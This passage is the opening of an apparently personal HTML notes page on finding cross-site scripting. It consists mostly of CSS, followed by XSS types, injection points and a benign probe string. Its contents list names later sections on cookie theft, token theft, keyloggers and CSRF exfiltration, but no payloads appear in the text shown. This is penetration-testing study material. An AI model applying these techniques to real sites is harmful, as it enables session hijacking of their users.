@@ -1,0 +1,1843 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2026-07-20 Mon 14:10 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Cross-Site Scripting</title>
+<meta name="author" content="termux" />
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" href="style.css" type="text/css"/>
+<style type='text/css'>
+<!--/*--><![CDATA[/*><!--*/
+/* nice-org-html.css
+;;==============================================================================
+;; Copyright (C) 2024, Ewan Townshend
+
+;; Author: Ewan Townshend
+;; URL: https://github.com/ewantown/nice-org-html
+;; Version: 1.2
+
+;;==============================================================================
+;; This program is free software; you can redistribute it and/or modify
+;; it under the terms of the GNU General Public License as published by
+;; the Free Software Foundation, either version 3 of the License, or
+;; (at your option) any later version.
+
+;; This program is distributed in the hope that it will be useful,
+;; but WITHOUT ANY WARRANTY; without even the implied warranty of
+;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+;; GNU General Public License for more details.
+
+;; You should have received a copy of the GNU General Public License
+;; along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+;; This file is not part of emacs.
+
+;;==============================================================================
+*/
+
+/* basic layout ***************************************************************/
+*,
+*::before,
+*::after {
+    box-sizing: border-box;
+}
+html {
+    font-family: Sans;
+    line-height: 1.3;
+    font-size: calc(15px + 0.390625vw);
+    -webkit-text-size-adjust: 100%;
+}
+
+body {
+    background: #999; /* overwritten with theme --bg */
+    width: 100%;
+    min-height: 100vh;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    font-family:
+	-apple-system,
+	BlinkMacSystemFont,
+	segoe ui,
+	Roboto,
+	Oxygen,
+	Ubuntu,
+	Cantarell,
+	open sans,
+	helvetica neue,
+	sans-serif,
+	system-ui
+}
+
+#preamble,
+#postamble {
+    width: 100%;
+}
+
+#content {
+    width: 80%;
+    max-width: 80ch;
+    margin-left: 1rem;
+    margin-right: 1rem;
+    flex: 1;
+}
+
+/* custom facing **************************************************************/
+/* The variable values are injected by CSS pre-processing in et-org-html.el */
+:root {
+    --bc-tb: #000000;
+    --bc-block: #595959;
+    --clr: #000000;
+    --clr-tb-hd: #000000;
+    --clr-code: #000000;
+    --bg: #fbf7f0;
+    --bg-code: #cab9b2;
+    --bg-tb-hd: #cab9b2;
+    --bg-block: #efe9dd;
+    --clr-link: #531ab6;
+    --clr-title: #000000;
+    --clr-todo: #00598b;
+    --bg-todo: initial;
+    --clr-done: #7f0000;
+    --bg-done: initial;
+    --ts-clr: #0031a9;
+    --mg: 20px;
+    --w-toc: 300px;
+    --bg-keyword: initial;
+    --clr-keyword: #0031a9;
+    --bg-constant: initial;
+    --clr-constant: #531ab6;
+    --bg-comment: initial;
+    --clr-comment: #7f0000;
+    --bg-comment-delimiter: initial;
+    --clr-comment-delimiter: #7f0000;
+    --bg-function: initial;
+    --clr-function: #602938;
+    --bg-variable: initial;
+    --clr-variable: #00603f;
+    --bg-preprocessor: initial;
+    --clr-preprocessor: #894000;
+    --bg-doc: initial;
+    --clr-doc: #304463;
+    --bg-builtin: initial;
+    --clr-builtin: #721045;
+    --bg-string: initial;
+    --clr-string: #00598b;
+    --clr-note: #0969da;
+    --clr-tip: #1a7f37;
+    --clr-important: #8250df;
+    --clr-warning: #9a6700;
+    --clr-caution: #cf222e;
+}
+
+body[data-mode='light'] {
+    background: var(--bg);
+    color: var(--clr);
+}
+
+body[data-mode='dark'] {
+    background: var(--bg);
+    color: var(--clr);
+    --bc-tb: #ffffff;
+    --bc-block: #989898;
+    --clr: #ffffff;
+    --clr-code: #ffffff;
+    --clr-tb-hd: #ffffff;
+    --bg: #0d0e1c;
+    --bg-tb-hd: #484d67;
+    --bg-code: #484d67;
+    --bg-block: #1d2235;
+    --clr-link: #b6a0ff;
+    --clr-title: #ffffff;
+    --clr-todo: #2fafff;
+    --bg-todo: initial;
+    --clr-done: #ef8386;
+    --bg-done: initial;
+    --ts-clr: #79a8ff;
+    --mg: 20px;
+    --w-toc: 300px;
+    --bg-keyword: initial;
+    --clr-keyword: #79a8ff;
+    --bg-constant: initial;
+    --clr-constant: #b6a0ff;
+    --bg-comment: initial;
+    --clr-comment: #ef8386;
+    --bg-comment-delimiter: initial;
+    --clr-comment-delimiter: #ef8386;
+    --bg-function: initial;
+    --clr-function: #f78fe7;
+    --bg-variable: initial;
+    --clr-variable: #4ae2f0;
+    --bg-preprocessor: initial;
+    --clr-preprocessor: #ff7f86;
+    --bg-doc: initial;
+    --clr-doc: #9ac8e0;
+    --bg-builtin: initial;
+    --clr-builtin: #feacd0;
+    --bg-string: initial;
+    --clr-string: #2fafff;
+    --clr-note: #0969da;
+    --clr-tip: #1a7f37;
+    --clr-important: #8250df;
+    --clr-warning: #9a6700;
+    --clr-caution: #cf222e;
+}
+
+/* exceptions for badly rendering themes **************************************/
+body[data-theme='leuven'],
+body[data-theme='leuven-dark'] {
+    --bg-code: var(--bg-block);
+}
+
+/* ootb page layout ***********************************************************/
+#view-controls {
+    position: sticky;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    top: 0;
+    left: 0;
+    width: 100%;
+    background: var(--bg);
+    color: var(--clr-code);
+    height: 2.5rem;
+    padding-top: 1.25rem;
+    padding-bottom: 1.25rem;
+    z-index: 100;
+    border-radius: 5px; /* Rounded corners */
+}
+#toggle-mode {
+    position: absolute;
+    right: 5%;
+    display: block;
+    text-align: center;
+    font-size: 1.5rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+#goto-top {
+    display: none;
+}
+#goto-top[data-show="true"] {
+    position: relative;
+    display: block;
+    text-align: center;
+    font-size: 1rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+#toggle-toc {
+    display: none;
+}
+#toggle-toc[data-show="true"] {
+    position: absolute;
+    left: 5%;
+    display: block;
+    text-align: center;
+    font-size: 1.5rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+
+#toggle-toc:hover,
+#goto-top:hover,
+#toggle-mode:hover {
+    cursor: pointer;
+}
+
+#table-of-contents {
+    display: none;
+}
+#table-of-contents[data-show="true"] {
+    width: 80%;
+    max-width: 80rem;
+    margin-left: 1rem;
+    margin-right: 1rem;
+    background: var(--bg);
+    scrollbar-width: none;
+    -ms-overflow-style: none;
+}
+
+#table-of-contents::-webkit-scrollbar {
+    display: none;
+}
+
+body[data-toc="true"] #content * {
+    display: none;
+}
+body[data-toc="true"] #content #table-of-contents,
+body[data-toc="true"] #content #table-of-contents * {
+    display: block;
+}
+
+
+/* misc elements **************************************************************/
+
+hr {
+    height: 0;
+    color: inherit;
+}
+
+b,
+strong {
+    font-weight: bolder;
+}
+
+code,
+kbd,
+samp,
+pre {
+    font-family:
+	Menlo,
+	ui-monospace,
+	SFMono-Regular,
+	Consolas,
+	'Liberation Mono',
+	monospace;
+}
+
+small {
+    font-size: 80%;
+}
+
+sub,
+sup {
+    font-size: 75%;
+    line-height: 0;
+    position: relative;
+    vertical-align: baseline;
+}
+
+sub {
+    bottom: -0.25em;
+}
+
+sup {
+    top: -0.5em;
+}
+
+table {
+    text-indent: 0;
+    border-color: inherit;
+}
+
+summary {
+    display: list-item;
+}
+
+h1 {
+    color: var(--clr-title);
+    text-align: center;
+}
+h2 {
+    margin-top: 2rem;
+    margin-bottom: 1rem;
+}
+
+code {
+    color: var(--clr-code);
+    background: var(--bg-code);
+    border-radius: 2px;
+    padding-left: 5px;
+    padding-right: 5px;
+}
+
+pre::-webkit-scrollbar {
+    display: none;
+}
+
+.todo {
+    color: var(--clr-todo);
+    background: var(--bg-todo);
+}
+
+.done {
+    color: var(--clr-done);
+    background: var(--bg-done);
+}
+
+.timestamp-wrapper {
+    font-size: 0.8rem;
+    color: var(--clr-ts);
+}
+
+table {
+    width: 100%;
+    border: 2px solid var(--bc-tb);
+}
+
+thead {
+    color: var(--clr-tb-hd);
+    background: var(--bg-tb-hd);
+}
+
+td, th {
+    border: thin solid var(--bc-tb);
+}
+
+li {
+    margin-top: 0.5rem;
+    margin-bottom: 0.5rem;
+}
+#text-table-of-contents li a:before {
+    content: "• "
+}
+
+a {
+    text-decoration: none;
+    color: var(--clr-link);
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+.MathJax_Display {
+    font-size: 1.25em;
+}
+
+img {
+    max-width: 100%;
+}
+
+pre {
+    padding: 1rem;
+    border: 1px solid var(--bc-block);
+    border-radius: 0.5rem;
+    background: var(--bg-block);
+    font-size: 0.9rem;
+    overflow-x: auto;
+    -ms-overflow-style: none;
+    scrollbar-width: thin;
+}
+
+.org-src-wrapper {
+    position: relative;
+    border: 1px solid var(--bc-block);
+    border-radius: 0.5rem;
+    background: var(--bg-code);
+}
+
+.org-src-bar {
+    position: relative;
+    top: 0rem;
+    width: 100%;
+    background: var(--bg-code);
+    border-radius: 0.5rem;
+    text-align: right;
+    min-height: 1rem;
+}
+
+.org-src-wrapper .org-src-container {
+    position: relative;
+    border: none;
+    border-radius: 0.5rem;
+    background: var(--bg-code);
+    z-index: 0;
+}
+
+.org-src-wrapper .org-src-container pre.src {
+    border: none !important;
+    background: var(--bg-code) !important;
+    padding-top: 0rem;
+    padding-bottom: 0rem;
+    margin-top: 0rem;
+    margin-bottom: 0rem;
+    padding-bottom: 1.6rem;
+}
+
+.org-src-wrapper .org-src-bar .srcLangLabel {
+    top: 0rem;
+    right: 1.6rem;
+    background-color: transparent;
+    color: var(--clr-doc);
+    border: none;
+    padding: 0.5rem;
+    padding-bottom: 0.3rem;
+    text-align: center;
+    text-decoration: none;
+    font-size: 0.8rem;
+    opacity: 0.5;
+    z-index: 1;
+    display: none;
+}
+
+.org-src-wrapper .org-src-bar .copyBtn {
+    top: 0rem;
+    right: 0.1rem;
+    background-color: transparent;
+    color: var(--clr-doc);
+    border: none;
+    padding: 0.5rem;
+    padding-right: 0.7rem;
+    padding-bottom: 0.3rem;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 0.8rem;
+    cursor: pointer;
+    opacity: 0.5;
+    z-index: 1;
+    transition: opacity 0.3s;
+}
+
+.org-src-wrapper .copyBtn:hover {
+    opacity: 1;
+}
+
+.org-src-wrapper .copyBtn i {
+    margin-right: 0.5rem;
+    padding: 0.5rem;
+}
+
+.admonition {
+    margin: 0.2rem;
+    color: inherit;
+    border-left: .25rem solid;
+}
+.admonition-title {
+    margin: 0 0 0.5rem 0.5rem;
+    padding: 0.5rem 0 0 0;
+    display: flex;
+    align-items: center;
+}
+.admonition-content > p {
+    margin: 0.5rem 0 0 0.5rem;
+    padding: 0 0 0.5rem 0;
+}
+
+.admonition.note {
+    border-left-color: var(--clr-note);
+}
+.admonition-title.note {
+    color: var(--clr-note);
+}
+.admonition-title.note:before {
+    content: '';
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-note);
+    mask-size: cover;    
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path class="admonition-icon-note" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>');    
+}
+.admonition-icon-note {
+    fill: var(--clr-note);
+}
+
+.admonition.tip {
+    border-left-color: var(--clr-tip);
+}
+.admonition-title.tip {
+    color: var(--clr-tip);
+}
+.admonition-title.tip:before {
+    content: '';
+    fill: var(--clr-tip);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-tip);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>');    
+}
+
+.admonition.important {
+    border-left-color: var(--clr-important);
+}
+.admonition-title.important {
+    color: var(--clr-important);
+}
+.admonition-title.important:before {
+    content: '';
+    fill: var(--clr-important);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-important);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v9.5A1.75 1.75 0 0 1 14.25 13H8.06l-2.573 2.573A1.458 1.458 0 0 1 3 14.543V13H1.75A1.75 1.75 0 0 1 0 11.25Zm1.75-.25a.25.25 0 0 0-.25.25v9.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h6.5a.25.25 0 0 0 .25-.25v-9.5a.25.25 0 0 0-.25-.25Zm7 2.25v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 9a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>');    
+}
+
+.admonition.warning {
+    border-left-color: var(--clr-warning);
+}
+.admonition-title.warning {
+    color: var(--clr-warning);
+}
+.admonition-title.warning:before {
+    content: '';
+    color: var(--clr-warning);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-warning);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>');
+}
+
+
+.admonition.caution {
+    border-left-color: var(--clr-caution);
+}
+.admonition-title.caution {
+    color: var(--clr-caution);
+}
+.admonition-title.caution:before {
+    content: '';
+    fill: var(--clr-caution);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-caution);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M4.47.22A.749.749 0 0 1 5 0h6c.199 0 .389.079.53.22l4.25 4.25c.141.14.22.331.22.53v6a.749.749 0 0 1-.22.53l-4.25 4.25A.749.749 0 0 1 11 16H5a.749.749 0 0 1-.53-.22L.22 11.53A.749.749 0 0 1 0 11V5c0-.199.079-.389.22-.53Zm.84 1.28L1.5 5.31v5.38l3.81 3.81h5.38l3.81-3.81V5.31L10.69 1.5ZM8 4a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 8 4Zm0 8a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>');    
+}
+/* responsive layouts *********************************************************/
+
+@media only screen and (max-width: 768px) {
+    #toggle-toc[data-show='true'] {
+	padding-right: 5%;
+    }
+    #toggle-mode {
+	padding-left: 5%;
+    }
+    #content {
+	width: 90%;
+    }
+}
+
+@media only screen and (max-width: 480px) {
+    #view-controls {
+	padding-top: 1.5em;
+	padding-bottom: 1.5em;
+    }
+    #toggle-toc[data-show='true'] {
+	padding-right: 5%;
+    }
+    #toggle-mode {
+	padding-left: 5%;
+    }
+    #content {
+	width: 90%;
+    }
+}
+
+
+/* generated header and footer ************************************************/
+
+#generated-header,
+#generated-footer {
+    width: 90%;
+    margin-left: 5%;
+    margin-right: 5%;
+    line-height: 1;
+}
+.generated header {
+    top: 0;
+    left: 0;
+}
+.generated footer {
+    bottom: 0;
+    left: 0;
+}
+.generated header a,
+.generated footer a {
+    display: inline;
+    color: var(--clr-title);
+    text-decoration: none;
+    transition: color .15s ease-in;
+}
+.generated header a:hover,
+.generated footer a:hover {
+    color: var(--clr-link);
+}
+
+.generated header nav {
+    position: relative;
+    margin-top: 1rem;
+    top: 0;
+    left: 0;
+}
+.generated footer nav {
+    position: relative;
+    bottom: 0;
+    left: 0;
+}
+
+.generated .separator {
+    display: block;
+    width: 111%;
+    margin-left: -5.5%;
+    max-width: 100vw;
+    height: 0.125rem;
+    background: var(--bg-code);
+}
+
+.generated a .nav-title,
+.generated a .nav-author {
+    display: inline;
+    margin-top: 1rem;
+    margin-bottom: 1rem;
+    padding-right: 10rem;
+}
+
+.generated .nav-title {
+    letter-spacing: .075rem;
+    font-weight: 500;
+}
+
+.generated .nav-toggle {
+    display: none;
+}
+.generated .nav-button {
+    display: none;
+}
+.generated .nav-list {
+    overflow-y: hidden;
+    display: block;
+    float: right;
+    list-style: none;
+    margin-bottom: 0;
+    margin-top: 0;
+}
+
+.generated .nav-item {
+    position: relative;
+    float: left;
+    margin: 0;
+}
+.generated .nav-link {
+    position: relative;
+    float: right;
+    margin-left: 2rem;
+    margin-right: 0rem;
+}
+
+.generated .nav-toggle {
+    max-height: 0;
+    visibility: hidden;
+    overflow-y: hidden;
+}
+
+.generated header .separator {
+    margin-top: 1rem;
+    margin-bottom: 0;
+}
+
+.generated footer .separator {
+    margin-bottom: 1rem;
+    margin-top: 0;
+}
+
+.generated .menu-sep {
+    display: none;
+    max-height: 0;
+    overflow-y: hidden;
+    transition: max-height 0.2s ease;
+}
+
+.generated footer {
+    padding-bottom: 1rem;
+}
+
+.generated.compact footer {
+    padding-bottom: 0;
+}
+
+.generated.compact header .separator {
+    margin-top: 0;
+    margin-bottom:0;
+}
+.generated.compact footer .separator {
+    margin-bottom: 1rem;
+}
+
+.generated.compact .nav-toggle {
+    visibility: visible;
+}
+
+.generated.compact .nav-toggle + label span::before {
+    transition: all 0.2s ease-in;
+}
+.generated.compact .nav-toggle:checked + label span::before {
+    transform: translateX(0.04rem) translateY(-0.25rem) rotate(90deg);
+    transition: all 0.2s ease;
+}
+
+.generated.compact .menu-sep {
+    display: flex;
+    max-height: 0rem;
+}
+.generated.compact .nav-toggle:checked + label + .menu-sep {
+    display: block;
+    position: relative;
+    max-height: 1rem;
+    transition: max-height 0.2s ease;
+}
+
+.generated.compact .nav-list {
+    float: none !important;
+    position: relative;
+    display: block;
+    padding-left: 0;
+    padding-right: 0;
+    z-index: 5;
+    width: 100%;
+    height: auto;
+    max-height: 0;
+    margin: 0;
+    overflow-x: hidden;
+    overflow-y: hidden;
+    transition: max-height 0.2s ease;
+}
+.generated.compact .nav-toggle:checked + label ~ .nav-list {
+    display: block;
+    max-height: 100rem;
+    overflow-y: hidden;
+}
+.generated.compact header .nav-toggle:checked + label ~ .nav-list {
+    transition: max-height 0.2s ease;
+}
+
+.generated.compact .nav-button {
+    display: inline;
+    position: relative;
+    float: right;
+    font-size: 1rem;
+}
+.generated.compact .nav-button span::before {
+    display: inline-block;
+    content: '\2807';
+    font-size: 2rem;
+    transform: translateX(0.25rem) translateY(-0.5rem);
+}
+
+.generated.compact .nav-item {
+    float: none !important;
+    text-align: center !important;
+}
+.generated.compact .nav-link {
+    line-height: 2rem;
+    margin-left: 2rem;
+    margin-right: 2rem;
+    float: none !important;
+}
+
+.generated.compact footer .separator.menu-sep {
+    margin-bottom: -1rem;
+}
+
+.hidden {
+    display: none;
+}
+
+.collapsible:hover {
+    cursor: pointer;
+}
+
+.collapsible.collapsed::after {
+    display: inline-block;
+    content: '...';
+}
+/*]]>*/-->
+</style>
+</head>
+<body>
+<div id="preamble" class="status">
+<div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
+</div>
+<div id="content" class="content">
+<h1 class="title">Cross-Site Scripting</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orgd5a54cb">1. XSS Types</a></li>
+<li><a href="#org21406f9">2. Finding XSS</a>
+<ul>
+<li><a href="#org95a3451">Injection Points</a></li>
+<li><a href="#orgb28e114">Initial Probe</a></li>
+</ul>
+</li>
+<li><a href="#orga81f1b5">3. Payloads by Context</a>
+<ul>
+<li><a href="#org0f7e1ee">HTML Body Context</a></li>
+<li><a href="#org2549f31">HTML Attribute Context</a></li>
+<li><a href="#org21f4246">JavaScript String Context</a></li>
+<li><a href="#org5e7efb2">JavaScript Template Literal Context</a></li>
+<li><a href="#org815c20c">URL/href Context</a></li>
+</ul>
+</li>
+<li><a href="#org295dd7a">4. Filter Bypass Techniques</a></li>
+<li><a href="#org1de18dc">5. Useful Payloads Beyond alert(1)</a>
+<ul>
+<li><a href="#orge026e2a">Confirm the origin (cleaner proof than alert)</a></li>
+<li><a href="#org085d234">Cookie theft</a></li>
+<li><a href="#org23d68ac">Session token theft (localStorage)</a></li>
+<li><a href="#orgada0c8f">Keylogger</a></li>
+<li><a href="#orgee9010d">Forced request as victim (CSRF via XSS)</a></li>
+<li><a href="#org258040d">Capture and exfiltrate CSRF token</a></li>
+</ul>
+</li>
+<li><a href="#org7c0f14d">6. DOM-Based XSS</a>
+<ul>
+<li><a href="#org8bef27d">Common Sources (attacker-controlled input)</a></li>
+<li><a href="#org74ed0c8">Common Sinks (dangerous write operations)</a></li>
+<li><a href="#orgefc27e2">Testing DOM XSS</a></li>
+</ul>
+</li>
+<li><a href="#org111ed04">7. Blind XSS</a></li>
+<li><a href="#org07197b9">8. Stored vs Reflected — Testing Approach</a>
+<ul>
+<li><a href="#org1e7e8b1">Reflected</a></li>
+<li><a href="#orgf0534ec">Stored</a></li>
+</ul>
+</li>
+<li><a href="#orgaf279ec">9. Reporting Template</a></li>
+<li><a href="#orge1209d1">Tips</a></li>
+</ul>
+</div>
+</div>
+<p>
+Malicious JavaScript injected into a page executes in the victim's
+browser under the target origin. The attacker inherits the victim's
+session, can read the DOM, exfiltrate cookies, make authenticated
+requests, and redirect users. Severity depends on type and context
+— Stored XSS is highest impact, DOM-based the hardest to detect.
+</p>
+
+<p>
+Related: <a href="../org/20260213T071848==csrf--cross-site-request-forgery__cybersecurity_technique.html">CSRF</a>
+         <a href="../org/20260613T235746--http-security-headers__cybersecurity_pentesting_technique.html">HTTP Security Headers</a>
+         <a href="../org/20260613T215734--session-management-testing__cybersecurity_pentesting_technique.html">Session Management Testing</a>
+         <a href="../org/20260611T064753--web-application-testing-methodology__cybersecurity_pentesting_technique.html">Web Application Testing Methodology</a>
+         <a href="../org/20260614T002010--pt1-vulnerability-classification-cheat-sheet__comparison_cybersecurity_pentesting_reference.html">PT1 Vulnerability Classification Cheat Sheet</a>
+</p>
+<div id="outline-container-orgd5a54cb" class="outline-2">
+<h2 id="orgd5a54cb">1. XSS Types</h2>
+<div class="outline-text-2" id="text-orgd5a54cb">
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="org-left" />
+
+<col  class="org-left" />
+
+<col  class="org-left" />
+
+<col  class="org-left" />
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">Type</th>
+<th scope="col" class="org-left">How it works</th>
+<th scope="col" class="org-left">Persistence</th>
+<th scope="col" class="org-left">Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">Reflected</td>
+<td class="org-left">Input echoed back in response</td>
+<td class="org-left">None — victim must click link</td>
+<td class="org-left">Medium</td>
+</tr>
+
+<tr>
+<td class="org-left">Stored</td>
+<td class="org-left">Payload stored in DB, rendered for all users</td>
+<td class="org-left">Persistent</td>
+<td class="org-left">High</td>
+</tr>
+
+<tr>
+<td class="org-left">DOM-based</td>
+<td class="org-left">JS reads attacker-controlled source and writes to sink</td>
+<td class="org-left">Varies</td>
+<td class="org-left">Medium–High</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<div id="outline-container-org21406f9" class="outline-2">
+<h2 id="org21406f9">2. Finding XSS</h2>
+<div class="outline-text-2" id="text-org21406f9">
+</div>
+<div id="outline-container-org95a3451" class="outline-3">
+<h3 id="org95a3451">Injection Points</h3>
+<div class="outline-text-3" id="text-org95a3451">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_5b18295b64c34dc38fd1a9e286223ff1>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_5b18295b64c34dc38fd1a9e286223ff1=document.querySelector('button[name=btn_5b18295b64c34dc38fd1a9e286223ff1]');
+copyBtnbtn_5b18295b64c34dc38fd1a9e286223ff1.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`Test every input that appears in the response:\n- URL parameters: ?q=, ?name=, ?search=\n- Form fields: login, search, comment, profile fields\n- HTTP headers reflected in response: User-Agent, Referer, X-Forwarded-For\n- JSON/API response values rendered in the page\n- URL path segments: /user/<name>/profile\n`);copyBtnbtn_5b18295b64c34dc38fd1a9e286223ff1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5b18295b64c34dc38fd1a9e286223ff1.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-text">Test every input that appears in the response:
+- URL parameters: ?q=, ?name=, ?search=
+- Form fields: login, search, comment, profile fields
+- HTTP headers reflected in response: User-Agent, Referer, X-Forwarded-For
+- JSON/API response values rendered in the page
+- URL path segments: /user/&lt;name&gt;/profile
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgb28e114" class="outline-3">
+<h3 id="orgb28e114">Initial Probe</h3>
+<div class="outline-text-3" id="text-orgb28e114">
+<p>
+Start with a benign string that is visually distinct — confirm
+it appears in the response before injecting payloads:
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d162f4d4793b4b9e80c7ee09de72798b>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_d162f4d4793b4b9e80c7ee09de72798b=document.querySelector('button[name=btn_d162f4d4793b4b9e80c7ee09de72798b]');
+copyBtnbtn_d162f4d4793b4b9e80c7ee09de72798b.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Probe string — check where it appears in the response\nxsstest1234\n\n# Then check the page source to identify the context:\n# - Between HTML tags: <p>xsstest1234</p>\n# - In an attribute: <input value=\"xsstest1234\">\n# - In a script block: var x = \"xsstest1234\";\n# - In a URL: href=\"xsstest1234\"\n`);copyBtnbtn_d162f4d4793b4b9e80c7ee09de72798b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d162f4d4793b4b9e80c7ee09de72798b.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Probe string &#8212; check where it appears in the response
+</span>xsstest1234
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Then check the page source to identify the context:
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">- Between HTML tags: &lt;p&gt;xsstest1234&lt;/p&gt;
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">- In an attribute: &lt;input value="xsstest1234"&gt;
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">- In a script block: var x = "xsstest1234";
